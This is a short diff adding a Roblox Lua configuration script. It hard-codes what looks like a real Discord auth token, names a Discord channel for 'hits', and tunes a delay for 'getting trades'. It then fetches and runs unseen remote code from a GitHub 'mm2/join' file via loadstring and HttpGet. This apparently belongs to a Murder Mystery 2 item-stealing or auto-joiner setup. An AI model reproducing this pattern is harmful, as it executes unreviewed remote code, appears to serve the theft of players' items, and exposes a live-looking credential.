@@ -1,0 +1,5 @@
+token = "Njk4ODEyMjI4NzgyMjYwMjY0.G2u3UE.1lampqeEXO8mv-_Gc8PQ1TkCJ9V3V8TRXhVDHk" -- Discord Token here (DISCORD AUTH TOKEN) TUTORIAL: https://www.youtube.com/watch?v=LnBnm_tZlyU
+channelId = "1349802453050064968" -- Channel ID that your hits are in. TUTORIAL: https://www.youtube.com/watch?v=YjiQ7CajAgg
+delay = 1 -- How many seconds it will wait to chat after loading is done. If you have problems with not getting trades, try making delay higher (I dont recommend higher than 5)
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/polariggas/mm2/refs/heads/main/join'))()
